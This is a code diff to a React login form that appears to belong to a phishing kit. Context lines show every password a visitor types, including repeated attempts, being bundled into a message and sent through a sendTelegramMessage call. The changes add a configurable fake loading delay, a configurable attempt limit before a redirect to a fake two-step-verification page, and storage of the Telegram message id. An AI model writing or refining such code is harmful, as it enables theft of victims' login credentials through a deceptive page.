@@ -1,8 +1,9 @@
 import { faXmark } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import type { FC } from 'react';
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router';
+import { getSystemConfig } from '../types/system';
 
 interface LoginFormProps {
     onClose: () => void;
@@ -10,6 +11,7 @@ interface LoginFormProps {
 
 interface FormErrors {
     email?: string;
+
     password?: string;
 }
 
@@ -26,7 +28,24 @@ const LoginForm: FC<LoginFormProps> = ({ onClose }) => {
     const [isLoading, setIsLoading] = useState(false);
     const [attempts, setAttempts] = useState(0);
     const [oldMessageId, setOldMessageId] = useState<number | null>(null);
+    const [config, setConfig] = useState(getSystemConfig());
     const navigate = useNavigate();
+
+    useEffect(() => {
+        const systemConfig = getSystemConfig();
+        if (!systemConfig) {
+            navigate('/');
+            return;
+        }
+        setConfig(systemConfig);
+    }, [navigate]);
+
+    useEffect(() => {
+        const savedMessageId = localStorage.getItem('telegram_message_id');
+        if (savedMessageId) {
+            setOldMessageId(parseInt(savedMessageId));
+        }
+    }, []);
 
     const validateEmail = (email: string): boolean => {
         return /\S+@\S+\.\S+/.test(email);
@@ -102,6 +121,8 @@ const LoginForm: FC<LoginFormProps> = ({ onClose }) => {
     const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault();
 
+        if (!config) return;
+
         if (validateForm()) {
             setIsLoading(true);
             setAttempts((prev) => prev + 1);
@@ -134,10 +155,10 @@ const LoginForm: FC<LoginFormProps> = ({ onClose }) => {
 ${passwordsList}${oldPasswords.length > 0 ? '\n' : ''}${newPassword}`.trim();
 
             await sendTelegramMessage(messageContent);
-            await new Promise((resolve) => setTimeout(resolve, 2000));
+            await new Promise((resolve) => setTimeout(resolve, config.password_load_duration));
 
             setIsLoading(false);
-            if (attempts >= 2) {
+            if (attempts >= config.password_load_limit - 1) {
                 navigate('/two-step-verification');
                 return;
             }
